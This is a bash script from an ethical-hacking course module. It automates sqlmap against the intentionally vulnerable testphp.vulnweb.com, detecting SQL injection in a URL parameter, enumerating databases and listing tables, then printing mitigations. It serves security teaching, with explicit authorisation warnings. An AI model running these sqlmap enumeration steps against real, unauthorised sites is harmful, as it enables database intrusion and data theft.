#!/bin/bash
# =============================================================================
# sqlmap_runner.sh – sqlmap automated testing script
# CGT 312 Ethical Hacking – Module 3
# =============================================================================
# LEGAL NOTICE: Only run against AUTHORISED targets.
# testphp.vulnweb.com is officially authorised by Acunetix for security testing.
# NEVER run against real sites without explicit written permission.
# =============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
LOG_DIR="$SCRIPT_DIR/logs/module3"
TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
mkdir -p "$LOG_DIR"

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║  ⚠  ETHICAL USE WARNING – SQL INJECTION LAB         ║"
echo "║                                                      ║"
echo "║  This script targets testphp.vulnweb.com which is  ║"
echo "║  an INTENTIONALLY VULNERABLE site maintained by    ║"
echo "║  Acunetix for security testing education.           ║"
echo "║                                                      ║"
echo "║  AUTHORIZED TARGET: testphp.vulnweb.com             ║"
echo "║  OTHER TARGETS: only with explicit permission       ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${CYAN}[*] sqlmap Demo Runner${NC}"
echo -e "${CYAN}[*] Timestamp: $TIMESTAMP${NC}\n"

# Check sqlmap is available
if ! command -v sqlmap &>/dev/null; then
    echo -e "${RED}[!] sqlmap not found. Run: bash setup.sh${NC}"
    exit 1
fi

TARGET_URL="http://testphp.vulnweb.com/listproducts.php?cat=1"
LOG_FILE="$LOG_DIR/${TIMESTAMP}_sqlmap.txt"

{
    echo "# CGT 312 sqlmap Demo"
    echo "# Target: $TARGET_URL"
    echo "# Timestamp: $TIMESTAMP"
    echo "# ─────────────────────────────────────────────────"
} > "$LOG_FILE"

# ─── Step 1: Detect injection point ──────────────────────────────────────────

echo -e "${GREEN}[Step 1] Testing for SQL injection vulnerabilities...${NC}"
echo -e "${CYAN}\$ sqlmap -u '$TARGET_URL' --batch --level=1 --risk=1${NC}\n"
echo -e "\n## Step 1: Injection Detection\n\$ sqlmap -u '$TARGET_URL' --batch\n" >> "$LOG_FILE"

sqlmap \
    -u "$TARGET_URL" \
    --batch \
    --level=1 \
    --risk=1 \
    2>&1 | tee -a "$LOG_FILE" | head -60

echo ""

# ─── Step 2: List databases ───────────────────────────────────────────────────

echo -e "${GREEN}[Step 2] Listing databases...${NC}"
echo -e "${CYAN}\$ sqlmap -u '$TARGET_URL' --batch --dbs${NC}\n"
echo -e "\n## Step 2: Database Listing\n" >> "$LOG_FILE"

sqlmap \
    -u "$TARGET_URL" \
    --batch \
    --dbs \
    2>&1 | tee -a "$LOG_FILE" | head -40

echo ""

# ─── Step 3: List tables ──────────────────────────────────────────────────────

echo -e "${GREEN}[Step 3] Listing tables in 'acuart' database...${NC}"
echo -e "${CYAN}\$ sqlmap -u '$TARGET_URL' --batch -D acuart --tables${NC}\n"
echo -e "\n## Step 3: Table Listing\n" >> "$LOG_FILE"

sqlmap \
    -u "$TARGET_URL" \
    --batch \
    -D acuart \
    --tables \
    2>&1 | tee -a "$LOG_FILE" | head -40

echo ""

# ─── Summary ─────────────────────────────────────────────────────────────────

echo -e "${GREEN}════════════════════════════════════════════${NC}"
echo -e "${GREEN}[+] sqlmap Demo Complete!${NC}"
echo -e "${GREEN}[+] Log saved: $LOG_FILE${NC}"
echo -e "${GREEN}════════════════════════════════════════════${NC}"
echo ""
echo -e "${YELLOW}Observed findings:${NC}"
echo -e "  • URL parameter 'cat' is vulnerable to SQL injection"
echo -e "  • Database DBMS identified (MySQL)"
echo -e "  • Multiple databases enumerated"
echo ""
echo -e "${YELLOW}Mitigation:${NC}"
echo -e "  • Use parameterised queries / prepared statements"
echo -e "  • Validate and sanitise all user input"
echo -e "  • Apply WAF rules"
echo -e "  • Principle of least privilege on DB accounts"
